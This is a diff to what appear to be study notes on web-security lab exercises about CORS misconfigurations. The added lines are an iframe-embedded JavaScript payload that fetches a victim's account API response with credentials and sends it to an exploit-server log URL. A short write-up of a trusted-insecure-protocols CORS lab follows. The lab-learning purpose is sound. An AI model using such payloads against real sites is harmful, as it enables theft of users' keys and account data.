@@ -38,6 +38,19 @@ location='https://exploit-exploit_id.exploit-server.net/log?key='+this.responseT
 </script>"></iframe>
 ```
 
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://lab_id.net/account_api/?posixtime=',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit-exploit_id.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
+
 - ==CORS vulnerability with trusted insecure protocols== 
   1. Response contains the `Access-Control-Allow-Credentials`
   2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. Added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
